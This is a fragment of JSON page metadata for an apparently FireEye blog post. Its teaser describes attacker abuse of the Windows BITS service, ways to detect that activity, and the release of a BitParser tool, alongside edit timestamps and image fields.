      "text": "\u003Cp\u003EHow attackers use the Background Intelligent Transfer Service (BITS),\u0026nbsp;techniques for detecting attacker activity, and the public release of our BitParser tool.\u003C\/p\u003E\n",
      "jcr:lastModified": "Tue Mar 30 2021 20:18:43 GMT+0000",
      "sling:resourceType": "social\/blog\/components\/entrytextteaser"
    },
    "image": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "jcr:lastModified": "Wed Mar 31 2021 14:57:26 GMT+0000",
      "imageRotate": "0"
    }
  }
}
